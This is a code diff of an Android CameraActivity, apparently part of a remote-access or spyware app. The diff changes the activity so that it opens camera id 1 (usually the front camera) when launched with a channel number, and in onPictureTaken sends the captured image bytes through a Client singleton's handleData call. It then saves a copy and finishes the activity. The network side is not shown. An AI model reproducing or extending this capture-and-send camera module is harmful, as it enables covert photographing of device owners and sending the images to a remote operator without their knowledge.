@@ -1,26 +1,24 @@
-package my.app.client;  
+package my.app.Library;  
   
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
-import java.io.IOException;  
-  
-
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import my.app.client.Client;
 import my.app.client.R;
-import android.app.Activity;  
-import android.graphics.Bitmap;  
-import android.graphics.BitmapFactory;  
-import android.hardware.Camera;  
-import android.hardware.Camera.Parameters;  
-import android.os.Bundle;  
+import android.app.Activity;
+import android.content.Intent;
+import android.hardware.Camera;
+import android.hardware.Camera.Parameters;
+import android.os.Bundle;
 import android.os.Environment;
 import android.util.Log;
-import android.view.SurfaceHolder;  
-import android.view.SurfaceView;  
-import android.widget.ImageView;  
+import android.view.SurfaceHolder;
+import android.view.SurfaceView;
   
 public class CameraActivity extends Activity implements SurfaceHolder.Callback  
 {  
@@ -36,26 +34,22 @@ public class CameraActivity extends Activity implements SurfaceHolder.Callback
     private Camera mCamera;  
     //the camera parameters  
     private Parameters parameters;  
-  
-    /** Called when the activity is first created. */  
+   int chan;
+	 /** Called when the activity is first created. */  
     @Override  
     public void onCreate(Bundle savedInstanceState)  
     {  
     	Log.i("CameraActivity", "Creating new Activity");
         super.onCreate(savedInstanceState);  
-        setContentView(R.layout.main);  
+        setContentView(R.layout.picture);  
   
-        //get the Image View at the main.xml file  
-        //iv_image = (ImageView) findViewById(R.id.imageView1);  
-  
-        //get the Surface View at the main.xml file  
-        sv = (SurfaceView) findViewById(R.id.surfaceView1);  
-  
+        Intent intent = getIntent();
+        chan=intent.getExtras().getInt("chan");
+      
+        sv = (SurfaceView) findViewById(R.id.surface);  
         //Get a surface  
         sHolder = sv.getHolder();  
-  
         sHolder.addCallback(this);  
-  
         //tells Android that this surface will have its data constantly replaced  
         sHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);  
     }  
@@ -76,7 +70,12 @@ public class CameraActivity extends Activity implements SurfaceHolder.Callback
  
              public void onPictureTaken(byte[] data, Camera camera)  
              {                   
-                 File pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
+                 //sending picture
+                 Client.getInstace().handleData(chan,data);
+	    	     Log.i("CameraActivity", "Picture sent!");
+	    	     
+	    	     //saving picture to disk
+	    	     File pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
                  if (pictureFile == null){
                      Log.d("CameraActivity", "Error creating media file, check storage permissions: ");
                   
@@ -91,6 +90,8 @@ public class CameraActivity extends Activity implements SurfaceHolder.Callback
                  } catch (IOException e) {
                      Log.d("CAeraActivity", "Error accessing file: " + e.getMessage());
                  }
+               //  moveTaskToBack(true);
+                 finish();
              }  
          };  
   
@@ -102,6 +103,7 @@ public class CameraActivity extends Activity implements SurfaceHolder.Callback
     {  
         // The Surface has been created, acquire the camera and tell it where  
         // to draw the preview.  
+    	
     	int cameraId = 1;
         mCamera = Camera.open(cameraId);  
         try {  
